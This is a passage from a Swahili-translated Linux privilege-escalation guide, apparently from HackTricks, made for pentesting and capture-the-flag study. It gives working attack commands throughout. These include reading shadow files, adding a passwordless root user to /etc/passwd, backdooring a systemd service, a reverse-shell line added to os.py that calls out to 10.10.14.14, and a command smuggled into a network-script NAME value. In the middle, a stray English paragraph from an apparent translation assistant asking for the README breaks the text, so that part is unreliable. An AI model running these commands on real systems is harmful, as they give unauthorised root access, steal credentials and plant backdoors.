screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo kwa **matoleo ya zamani ya tmux**. Sikuwa na uwezo wa hijack kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, etc) kati ya September 2006 na May 13th, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii hutokea wakati wa kuunda ssh key mpya kwenye OS hizo, kwani **tu 32,768 variations zilikuwa zinawezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kukokotolewa na **ukiwa na ssh public key unaweza kutafuta corresponding private key**. Unaweza kupata possibilities zilizokokotolewa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza kama password authentication inaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaeleza kama public key authentication inaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, inaeleza kama server inaruhusu login kwa akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaeleza kama root anaweza kuingia kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza login kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza login kwa private key pekee
- `forced-commands-only`: Root anaweza login kwa private key pekee na ikiwa command options zimetajwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili zinazojumuisha public keys ambazo zinaweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitatengenezwa kwa home directory. **Unaweza kuonyesha absolute paths** (zinazoanza na `/`) au **relative paths kutoka kwenye home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Marekebisho hayo yataonyesha kwamba ikiwa utajaribu kuingia kwa kutumia funguo za **private** za mtumiaji "**testusername**", ssh italinganisha public key ya ufunguo wako na zile zilizopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) zikikaa kwenye server yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** located in your **initial host**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anapohamia kwenye mashine tofauti, host hiyo itaweza kufikia funguo (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kufuta** chaguzi hizi na kuruhusu au kupinga usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kupinga** ssh-agent forwarding kwa kutumia neno muhimu `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa utagundua kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **huenda ukaweza kuitumia vibaya ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili Muhimu

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripiti zinazotekelezwa wakati mtumiaji anapofungua shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote kati yao unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script ya profile yoyote isiyo ya kawaida inapatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zina jina tofauti au kunaweza kuwa na nakala. Kwa hivyo inashauriwa **kuzitafuta zote** na **kuangalia kama unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa nayo).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nywila kwa mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md contents. Please paste the file text you want translated (or grant access). Also confirm these details:

- Do you want me to generate a random password for user `hacker`? (Yes/No)
- If Yes, any password requirements (length, character classes)?
- Where should I add the user/password in the document (e.g., append at end, under a specific section)?  
- Should the password be shown in plain text in the markdown, or masked/placeholder?

Once you provide the file text and confirm the above, I'll return the translated markdown (Swahili) with the `hacker` user and generated password inserted as requested.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika katika baadhi ya **faili za usanidi za huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **modify the Tomcat service configuration file inside /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara ijayo tomcat itakapowashwa.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ile ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Eneo Lisilo la Kawaida/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa dakika chache zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fayil za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafaili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye maneno ya siri

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na maneno ya siri**.\
**Chombo kingine kinachovutia** unachoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata maneno mengi ya siri yaliyohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yao**. Kadri logs inavyokuwa za kushangaza zaidi, ndivyo zitakavyovutia zaidi (labda).\
Pia, baadhi ya **"bad"** configured (backdoored?) **audit logs** zinaweza kukuruhusu **kurekodi maneno ya siri** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili kusoma logs, kikundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitasadia sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Pia unapaswa kuangalia faili zinazojumuisha neno "**password**" katika **jina** lao au ndani ya **maudhui**, na pia ukague IPs na emails ndani ya logs, au regexps za hashes.  
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **kutoka wapi** python script itaendeshwa na unaweza **kuandika ndani** ya kabrasha hilo au unaweza **kubadilisha python libraries**, unaweza kubadilisha OS library na kuitia backdoor (ikiwa unaweza kuandika mahali python script itaendeshwa, nakili na ubandike os.py library).

Ili **backdoor the library** ongeza tu mwishoni mwa os.py library mstari ufuatao (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unaruhusu watumiaji wenye **write permissions** kwenye faili ya logi au kwenye directorie zake mzazi kupata uwezo wa juu. Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kuchezwa ili kutekeleza faili yoyote, hasa katika directories kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua permissions si tu katika _/var/log_ bali pia katika kila directory ambapo log rotation inafanywa.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` and older

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza ku-exploit udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua kuwa unaweza kubadilisha logs, angalia nani anasimamia logs hizo na angalia kama unaweza escalate privileges kwa kubadilisha logs na symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza kuandika (`write`) skripti ya `ifcf-<whatever>` katika _/etc/sysconfig/network-scripts_ **au** anaweza **adjust** skripti iliyopo, basi **system is pwned**.

Network scripts, _ifcg-eth0_ kwa mfano, hutumika kwa muunganisho wa mtandao. Zinaonekana kabisa kama .INI files. Hata hivyo, zinatolewa (~sourced~) kwenye Linux na Network Manager (dispatcher.d).

Katika mfano wangu, thamani ya `NAME=` katika network scripts hizi haishughulikiwi ipasavyo. **Ikiwa jina lina white/blank space, mfumo hujaribu kutekeleza sehemu iliyofuata baada ya nafasi hiyo.** Hii inamaanisha kwamba **kila kitu kilicho baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **service management** ulioanzishwa na Ubuntu, unaotumia faili za konfigurasi kwa kazi za usimamizi wa huduma. Licha ya mpito kwenda Upstart, SysVinit scripts bado zinatumiwa pamoja na konfigurasi za Upstart kutokana na safu ya ulinganifu ndani ya Upstart.

**systemd** huibuka kama meneja wa kisasa wa uanzishaji na huduma, ukitoa vipengele vya juu kama kuanza daemoni kwa mahitaji, usimamizi wa automount, na snapshot za hali ya mfumo. Huandaa faili ndani ya `/usr/lib/systemd/` kwa ajili ya distribution packages na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikirahisisha mchakato wa usimamizi wa mfumo.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Jifunze zaidi na ona sample ya jumla inayoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
